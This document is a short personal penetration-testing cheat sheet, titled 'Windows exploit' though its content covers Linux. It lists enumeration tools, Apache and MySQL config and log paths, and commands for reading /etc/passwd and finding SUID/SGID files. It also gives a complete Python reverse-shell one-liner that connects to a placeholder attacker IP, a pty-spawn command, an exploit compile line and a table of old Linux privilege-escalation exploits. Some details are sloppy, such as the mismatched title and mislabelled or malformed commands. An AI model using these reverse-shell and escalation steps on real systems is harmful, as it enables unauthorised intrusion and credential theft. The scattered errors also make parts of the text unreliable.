# Windows exploit

## useful tools

* linux-priv-checker
    http://www.securitysift.com/download/linuxprivchecker.py

* ?? LinEnum
    http://www.rebootuser.com/?p=1758

## application and log directory

### Apache
* wwwroot:
    * /var/www/html
* conf:
    * /etc/apache2/httpd.conf
    * /etc/apache2/apache2.conf
    * /etc/httpd/httpd.conf
    * /etc/httpd/conf/httpd.conf
* log: 
    * /var/log/apache/access.log
    * /var/log/apache2/access.log
    * /var/log/httpd/access.log

### MySQL
* log:
* conf:
* Usally the password can be got from wwwroot/Configuration.php or something like that.

## Simple probing command

* uname -a / rpm -qa kernel / dpkg -l | grep kernel
    * uname give kernel info, but I need distro info sometimes.
    * rpm and dpkg can also give you package info for privilege escalation.

* Search for global writable sticky bit files

    find / -type f \(-perm -4000 -o -perm -2000 \) -print

    -print can be replace with -ls

* Search for password in log files ad conf files

* cat /etc/passwd / ls -al /etc/password

## mail

mail are store at /var/spool/mail

## Reverse shell

* Python
```python
-c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<YOURIP>",<YOURLISTENINGPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

* nc

* using /dev/tcp


## TTY shell

* tty shell can run sudo / su, while other cannot
* command python -c 'import pty; pty.spawn("/bin/sh")'

## Exploit compilation

If there is no tool for compile, compile at local
for 64bit window compilation

gcc -m32 -Wl,--hash-style=both -o 9545 9545.c


## Privilege escalation

## Exploit

| Exploit  | Type  | Target  | Note  |
|---|---|---|---|---|
| 'ip_append_data()' Ring0 Privilege Escalation  | PE  | Linux Kernel 2.6 < 2.6.19 (White Box 4 / <b>CentOS 4.4/4.5</b> / Fedora Core 4/5/6 x86)  | n/a |
|  Linux Kernel 2.2.x/2.4.x (RedHat) - 'ptrace/kmod' Local Privilege Escalation | PE  | Redhat | n/a  | 
| Linux Kernel 2.6 (Debian 4.0 / Ubuntu / Gentoo) UDEV < 1.4.1 – Local Privilege Escalation (1) |  PE | CentOS 5 | 2 variants  |
| Apache SpamAssassin Milter Plugin 0.3.1 |  PE | Apache SpamAssassin |  |
| pkexec Race condition |  PE | /usr/lib/policykit/... |  |
| MySQL 4.x/5.0 (Linux) – User-defined function (UDF) Dynamic library |  PE | mysqld run on root |  |